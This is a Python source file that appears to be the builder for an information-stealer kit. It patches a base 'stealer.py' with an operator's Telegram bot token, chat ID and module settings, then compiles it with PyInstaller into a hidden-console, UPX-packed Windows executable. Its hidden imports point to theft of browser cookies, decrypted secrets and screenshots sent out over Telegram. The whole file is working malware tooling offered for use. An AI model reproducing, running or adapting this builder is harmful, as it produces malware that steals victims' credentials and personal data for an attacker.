#!/usr/bin/env python3
import os
import sys
import json
import hashlib
import subprocess
import tempfile
import shutil
from pathlib import Path

STEALER_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(STEALER_DIR, "..", "dist")
BASE_STEALER = os.path.join(STEALER_DIR, "..", "stealer.py")
PASSWORD = "@xillenadapter"

def read_stealer_base():
    try:
        with open(BASE_STEALER, "r", encoding="utf-8") as f:
            return f.read()
    except Exception as e:
        return None

def modify_config(code, config):
    try:
        code = code.replace('TG_BOT_TOKEN = "YOUR_BOT_TOKEN"', f'TG_BOT_TOKEN = "{config["token"]}"')
        code = code.replace('TG_CHAT_ID = "YOUR_CHAT_ID"', f'TG_CHAT_ID = "{config["chat_id"]}"')
        code = code.replace('self.SLEEP_BEFORE_START = random.randint(5, 30)', f'self.SLEEP_BEFORE_START = {config["sleep_time"]}')
        code = code.replace('self.CHUNK_SIZE = 1024 * 1024', f'self.CHUNK_SIZE = {config["chunk_size"]}')
        
        # Add Telegram language support
        telegram_lang = config.get("telegram_language", "ru")
        code = code.replace('self.TELEGRAM_LANGUAGE = "ru"', f'self.TELEGRAM_LANGUAGE = "{telegram_lang}"')
        
        modules_config = "MODULES_CONFIG = {\n"
        for key, enabled in config["modules"].items():
            modules_config += f"    '{key}': {enabled},\n"
        modules_config += "}\n"
        
        code = code.replace("class AdvancedConfig:", f"{modules_config}\nclass AdvancedConfig:")
        return code
    except Exception as e:
        raise Exception(f"Error modifying config: {str(e)}")

def save_build(name, code):
    try:
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        output_path = os.path.join(OUTPUT_DIR, f"{name}.py")
        
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(code)
        
        return output_path
    except Exception as e:
        raise Exception(f"Error saving build: {str(e)}")

def compile_to_exe(py_path, name, icon_path=None):
    try:
        spec_content = f"""
# -*- mode: python ; coding: utf-8 -*-
block_cipher = None

a = Analysis(
    [r'{py_path.replace(chr(92), chr(92)+chr(92))}'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=[
        'browser_cookie3',
        'Crypto.Cipher.AES',
        'pyTelegramBotAPI',
        'psutil',
        'PIL.ImageGrab',
        'cryptography.fernet'
    ],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)
pyz = PYZ(a.pure, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    [],
    exclude_binaries=True,
    name='{name}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon={repr(icon_path) if icon_path else 'None'},
    distpath={repr(OUTPUT_DIR)},
)
"""
        builds_dir = os.path.join(os.path.dirname(OUTPUT_DIR), "builds")
        os.makedirs(builds_dir, exist_ok=True)
        spec_path = os.path.join(builds_dir, f"{name}.spec")
        with open(spec_path, "w", encoding="utf-8") as f:
            f.write(spec_content)
        
        cmd = f'pyinstaller "{spec_path}" --distpath "{OUTPUT_DIR}" --workpath "{os.path.join(os.path.dirname(OUTPUT_DIR), "build")}" --noconfirm --clean'
        
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        output_lines = []
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                output_lines.append(output.strip())
        
        if process.returncode == 0:
            # Копируем EXE из build в dist перед удалением build
            build_exe_path = os.path.join(os.path.dirname(OUTPUT_DIR), "build", name, f"{name}.exe")
            dist_exe_path = os.path.join(OUTPUT_DIR, f"{name}.exe")
            
            if os.path.exists(build_exe_path):
                shutil.copy2(build_exe_path, dist_exe_path)
                output_lines.append(f"EXE copied to: {dist_exe_path}")
            
            # Удаляем временные файлы
            build_dir = os.path.join(os.path.dirname(OUTPUT_DIR), "build")
            if os.path.exists(build_dir):
                shutil.rmtree(build_dir)
            if os.path.exists(spec_path):
                os.remove(spec_path)
            return True, output_lines
        else:
            return False, output_lines
            
    except Exception as e:
        return False, [f"Error compiling: {str(e)}"]

def get_builds_list():
    try:
        if not os.path.exists(OUTPUT_DIR):
            return []
        
        builds = []
        for file in os.listdir(OUTPUT_DIR):
            if file.endswith(('.py', '.exe')):
                file_path = os.path.join(OUTPUT_DIR, file)
                stat = os.stat(file_path)
                builds.append({
                    'name': file,
                    'size': stat.st_size,
                    'created': stat.st_ctime,
                    'type': 'exe' if file.endswith('.exe') else 'py'
                })
        
        return sorted(builds, key=lambda x: x['created'], reverse=True)
    except Exception as e:
        return []

def get_statistics():
    try:
        builds = get_builds_list()
        total_size = sum(build['size'] for build in builds)
        
        return {
            'total_builds': len(builds),
            'total_size_mb': round(total_size / (1024 * 1024), 2),
            'py_files': len([b for b in builds if b['type'] == 'py']),
            'exe_files': len([b for b in builds if b['type'] == 'exe'])
        }
    except Exception as e:
        return {'total_builds': 0, 'total_size_mb': 0, 'py_files': 0, 'exe_files': 0}

def check_password(password):
    input_hash = hashlib.sha256(password.encode()).hexdigest()
    stored_hash = hashlib.sha256(PASSWORD.encode()).hexdigest()
    return input_hash == stored_hash

def main():
    try:
        while True:
            line = sys.stdin.readline()
            if not line:
                break
            
            try:
                data = json.loads(line.strip())
                cmd = data.get('cmd')
                params = data.get('params', {})
                
                if cmd == 'check_password':
                    result = check_password(params.get('password', ''))
                    print(json.dumps({'status': 'ok', 'result': result}))
                
                elif cmd == 'build':
                    code = read_stealer_base()
                    if not code:
                        print(json.dumps({'status': 'error', 'message': 'Stealer base not found'}))
                        continue
                    
                    modified_code = modify_config(code, params)
                    output_path = save_build(params['name'], modified_code)
                    print(json.dumps({'status': 'ok', 'path': output_path}))
                
                elif cmd == 'compile':
                    success, output = compile_to_exe(params['path'], params['name'], params.get('icon_path'))
                    print(json.dumps({'status': 'ok' if success else 'error', 'output': output}))
                
                elif cmd == 'get_builds':
                    builds = get_builds_list()
                    print(json.dumps({'status': 'ok', 'builds': builds}))
                
                elif cmd == 'get_stats':
                    stats = get_statistics()
                    print(json.dumps({'status': 'ok', 'stats': stats}))
                
                else:
                    print(json.dumps({'status': 'error', 'message': 'Unknown command'}))
                    
            except json.JSONDecodeError:
                print(json.dumps({'status': 'error', 'message': 'Invalid JSON'}))
            except Exception as e:
                print(json.dumps({'status': 'error', 'message': str(e)}))
                
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
